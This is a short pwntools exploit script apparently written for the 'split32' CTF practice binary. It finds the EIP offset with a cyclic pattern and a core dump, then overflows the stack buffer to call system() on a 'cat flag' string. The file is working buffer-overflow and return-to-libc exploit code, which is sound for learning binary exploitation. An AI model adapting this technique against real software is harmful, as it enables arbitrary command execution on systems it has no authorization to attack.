from pwn import *


def run(argv = [], *a, **kw):
  return process([exe] + argv, *a, **kw)

#Setup
exe = "./split32"
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'info'
context.delete_corefiles = True

cat_flag_string_in_data_section = 0x0804a030

#EIP offset
#info("%#x target", elf.symbols[''])

p = run()
payload = cyclic(100)
p.sendlineafter('> ', payload)
p.wait()

core = p.corefile
eip_value = core.eip
eip_offset = cyclic_find(eip_value)
info('EIP offset: {offset}'.format(offset=eip_offset))

#0. offset
#1. system func addr
#2. 0x0 -> return addr after system call
#3. param for sytem call

payload = flat(
  asm('nop') * eip_offset,
  elf.symbols.system,
  0x0,
  cat_flag_string_in_data_section,
)


write("payload", payload)

p = run()
p.sendlineafter('> ', payload)
print(p.recvall())
